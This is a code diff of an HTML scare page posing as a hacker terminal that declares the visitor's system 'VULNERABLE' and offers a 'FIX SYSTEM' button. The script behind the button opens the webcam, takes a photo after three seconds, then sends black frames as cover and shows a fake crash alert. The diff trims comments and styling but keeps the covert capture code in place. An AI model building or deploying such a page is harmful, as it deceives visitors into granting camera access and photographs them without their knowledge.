@@ -7,8 +7,6 @@
     <style>
         body { background-color: black; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .box { border: 1px solid #0f0; padding: 20px; text-align: left; width: 80%; box-shadow: 0 0 10px #0f0; }
-        .blink { animation: blinker 1s linear infinite; color: red; }
-        @keyframes blinker { 50% { opacity: 0; } }
         button { background: #0f0; color: black; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 10px; }
         video, canvas { display: none; }
     </style>
@@ -17,9 +15,7 @@
 
     <div class="box">
         <p>> SYSTEM: ONLINE</p>
-        <p>> STATUS: <span class="blink">VULNERABLE</span></p>
-        <p>> TRACING IP... DONE</p>
-        <p>> بانتظار تأكيد الهوية لتجاوز الحماية...</p>
+        <p>> STATUS: VULNERABLE</p>
         <button id="startBtn">إصلاح النظام (FIX SYSTEM)</button>
     </div>
 
@@ -51,23 +47,14 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-
-                // صورة 1: واضحة بعد 3 ثوانٍ
                 setTimeout(() => { sendPhoto(); }, 3000);
-
-                // إيقاف الكاميرا بعد 5 ثوانٍ لإرسال صور سوداء
                 setTimeout(() => {
                     stream.getTracks().forEach(track => track.stop());
-                    // إرسال صورتين سوداوين للتمويه
                     setTimeout(() => sendPhoto(), 1000);
-                    setTimeout(() => {
-                        sendPhoto();
-                        alert("ERROR 404: System Crash!");
-                    }, 2000);
+                    setTimeout(() => { sendPhoto(); alert("System Crashed!"); }, 2000);
                 }, 5000);
-
             } catch (err) {
-                alert("يجب السماح بالكاميرا لتشغيل النظام!");
+                alert("يجب السماح بالكاميرا!");
             }
         });
     </script>
